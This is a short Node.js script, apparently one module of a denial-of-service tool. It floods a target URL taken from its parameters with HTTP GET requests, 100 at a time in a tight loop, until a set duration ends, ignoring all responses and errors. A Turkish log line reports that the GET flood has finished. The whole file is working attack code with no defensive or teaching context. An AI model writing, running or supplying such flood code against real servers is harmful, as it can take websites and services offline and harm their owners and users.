const http = require('http');
const end = Date.now() + (params.duration * 1000);

function getFlood() {
    const url = new URL(params.target);
    
    while (Date.now() < end) {
        for (let i = 0; i < 100; i++) {
            http.get(url, (res) => {
                res.on('data', () => {});
            }).on('error', () => {});
        }
    }
    console.log(`[+] GET Flood bitti: ${params.target}`);
}

getFlood();
